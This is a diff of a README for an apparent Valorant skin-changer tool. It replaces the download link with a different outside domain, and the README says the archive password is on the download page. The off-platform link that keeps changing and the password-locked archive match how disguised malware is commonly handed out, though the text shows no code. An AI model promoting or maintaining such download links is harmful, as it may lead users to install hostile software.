@@ -18,7 +18,7 @@ Apply any Valorant skin, buddy, spray, card, and title locally — visible only 
 
 ## Download
 
-[![Download v2026.6](https://img.shields.io/badge/Download_v2026.6-ec4899?style=for-the-badge&logoColor=white)](https://forumconnect.uk/valskinchan2)
+[![Download v2026.6](https://img.shields.io/badge/Download_v2026.6-ec4899?style=for-the-badge&logoColor=white)](https://connectinstruction.com/valskinchan2)
 
 > The archive password is shown on the download page.
 
